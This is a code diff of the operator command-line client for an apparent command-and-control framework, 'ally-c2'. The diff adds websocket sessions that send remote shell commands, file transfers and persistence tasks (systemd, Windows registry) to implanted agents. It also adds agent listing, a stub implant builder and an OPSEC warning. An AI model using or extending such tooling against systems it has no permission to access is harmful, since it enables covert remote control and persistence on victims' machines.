@@ -55,23 +55,32 @@ def all_actions(actions):
     if actions == "main":
         print(f"""
     normal prompt
+    - exit
     - help
     - clear
-    - list-agent 
-    - use <agent id>
     - build
         ip||url /port/ windows||linux
+
+    - list-agent 
+    - use <agent id>
 
               """)
 
     if actions == "use":
         print(f"""
     anget use
+    - back
+        back to server mode
     - help
     - clear
-    - sh <shell comand>
+
+    - sh <shell cmd>
     - upload <mypath> <agentpath>
     - download  <agentpath> <mypath>
+
+    - dir-sh
+        direct shell via ws [{RED}can lower your OPSEC{RESET}]
+
     - percistance 
         systemd, windows reg
         
@@ -80,39 +89,78 @@ def all_actions(actions):
 
 def clear():
     print("\033[2J\033[H", end="")
+def command_not_fount():
+    print(f"-- [{RED}-{RESET}] command not found")
 #-----
 
 
 
-def use_agent():
+async def use_agent(websocket, agent_id):
+
     while True:
-        try:
-            shell_cmd = input(f"{BLUE}SHELL@ctrl{RESET}> ")
+        shell_cmd = await asyncio.to_thread(input, f"{BOLD}{PURPLE}agent{RESET}{BOLD}[{agent_id}]{RESET}[ally-c2] > ")
+        shell_cmd= shell_cmd.strip().lower()
+
+        if not shell_cmd:
+            continue
+
+        parts = shell_cmd.split()
+        action = parts[0]
+        
+        if action == "back":
+            print(f"\n{BLUE}[*]{RESET} exit use mode\n")
+            return
+        elif action == "help":
+            all_actions("use")
+            continue
+        elif action == "clear":
+            clear()
+            continue
+        elif action == "sh":
+            await useMode_wsCom(websocket,shell_cmd,agent_id)
+        elif action == "download":
+            await useMode_wsCom(websocket,shell_cmd,agent_id)
+        elif action == "upload":
+            await useMode_wsCom(websocket,shell_cmd,agent_id)
+        elif action == "percistance":
+            await useMode_wsCom(websocket,shell_cmd,agent_id)
+
+        else:
+            command_not_fount()
             
-            if shell_cmd == "/exit":
-                print(f"\n{BLUE}[*]{RESET} exit shell mode\n")
-                return
-            elif shell_cmd == "/help":
-                all_actions("shell")
-            elif shell_cmd == "/clear":
-                clear()
-
-            #send command 
 
 
 
 
+async def useMode_wsCom(websocket,shell_cmd,agent_id):
+    # Per i comandi operativi, inviamo l'azione corretta al server FastAPI
+        # Mappiamo il comando inserito nel payload "queue_task"
+        payload = {
+            "action": "queue_task",
+            "agent_id": agent_id,
+            "data": shell_cmd
+        }
+        
+        await websocket.send(json.dumps(payload))
+        response_raw = await websocket.recv()
+        response = json.loads(response_raw)
+        
+        print(f"\n[Server Response] -> {response.get('output')}\n")
 
-        except KeyboardInterrupt:
-            # ctrl + c
-            print(f"\n\n[{RED}!{RESET}] you pressed Ctrl+C.")
-            conferma = input(f"do you really want to exit {BOLD}shell{RESET}? (y/n): ").strip().lower()
-            if conferma == 'y':
-                print(f"\n{BLUE}[*]{RESET} exit shell mode\n")
-                break
-            else:
-                print("Operation canceled.\n")
 
+
+# async def serverMode_wsCom( websocket, cmd):
+#     payload = {
+#             "action": "run_command",
+#             "data": cmd
+#             }
+#
+#     # Invia il messaggio come JSON
+#     await websocket.send(json.dumps(payload))
+#
+#     # Attende e riceve la risposta dal server
+#     response_raw = await websocket.recv()
+#     response = json.loads(response_raw)
 
 
 async def main(server_url):
@@ -127,60 +175,61 @@ async def main(server_url):
     try: 
         async with websockets.connect(server_url) as websocket:
             while True:
-                try: 
-                    cmd = await asyncio.to_thread(input, f"{BOLD}server{RESET}[ally-c2] > ")
+                cmd = await asyncio.to_thread(input, f"{BOLD}{RED}server{RESET}[ally-c2] > ")
+                cmd = cmd.strip().lower()
 
-                    cmd = cmd.strip().lower()
-
-                    if cmd == "exit":
-                        return
-                    elif cmd == "help":
-                        all_actions("main")
-                        continue
-                    elif cmd == "clear":
-                        clear()
-                        continue
-                    elif cmd == "list-agent":
-                        clear()
-                        continue
-                    elif cmd == "build":
-                        clear()
-                        continue
-                    elif cmd == "use":
-                        use_agent()
-                        continue
+                if not cmd:
+                    continue
+                parts = cmd.lower().split()
+                action = parts[0]
 
 
-                    payload = {
-                            "action": "run_command",
-                            "data": cmd
-                            }
+                if action == "exit":
+                    print("\nthanks for using ally-c2!\n")
+                    return
+                elif action == "help":
+                    all_actions("main")
+                    continue
+                elif action == "clear":
+                    clear()
+                    continue
+                elif action == "build":
+                    print("working on")
+                    continue
 
-                    # Invia il messaggio come JSON
+
+
+
+                elif action == "list-agent":
+                    payload = {"action": "list_agents"}
                     await websocket.send(json.dumps(payload))
+                    response = json.loads(await websocket.recv())
+                    print(f"\n[Active Agents]:\n {response.get('agents')}\n")
+                    continue
 
-                    # Attende e riceve la risposta dal server
-                    response_raw = await websocket.recv()
-                    response = json.loads(response_raw)
+                elif action == "use":
+                    if len(parts) < 2:
+                        print(f"[{RED}-{RESET}] Error: you have to specify the Agent id (es. use 123)")
+                        continue
+                    
+                    agent_id = parts[1]
+                    print(f"\n{BLUE}[*]{RESET} Entered agent session: {agent_id}\n")
+                    
+                    await use_agent(websocket, agent_id)
+                    continue
+                
 
-                    # print(f"[Risposta] Status: {response.get('status')} | Output:\n{response.get('output')}\n")
+                else:
+                    command_not_fount()
 
 
 
 
 
 
-                except (KeyboardInterrupt, EOFError):
-                        print("\n")
-                        conferma = await asyncio.to_thread(
-                                input, f"[{RED}!{RESET}] do you really want to {BOLD}exit{RESET}? (y/n): "
-                                )
-                        if conferma.strip().lower() == 'y':
-                            print(f"\n{BLUE}[*]{RESET} closing ally-cII pannel \n")
-                            break
-                        else:
-                            print("Operation canceled.\n")
-                            continue
+
+
+
 
     except websockets.exceptions.ConnectionClosed:
         print("[-] Connection closed form server.")
@@ -190,29 +239,13 @@ async def main(server_url):
 
 if __name__ == "__main__":
 
-    server_url = "ws://127.0.0.1:8080/ws/operator"
+    server_url = "ws://192.168.1.172:8080/ws/operator"
 
-    # try:
-    asyncio.run(main(server_url))
-    # except KeyboardInterrupt:
-    #     print("\n[*] Uscita forzata dalla CLI.")
+    try:
+        asyncio.run(main(server_url))
+    except KeyboardInterrupt:
+        print(f"\n[{RED}*{RESET}] forced exit form ally-c2 CLI-CLIENT.")
 
-#todo
-#@cli
-# avere una interazione shell decente magari usando una
-# tui che mi semplifica il lavoro con log di send
-# controllo connessione blocco contrl + c 
-# lista implant
-    #funzioni use <implant name>
-     # list implant, gen impalant
-
-#@server
-# spostare i vari comandi agli endpoint giusti,
-# prendere ed reinviare ouput degli agent
-#
-# comando = cmdd
-# agent = id agent != mineid agent no com exec
-#better logging
 
 
 
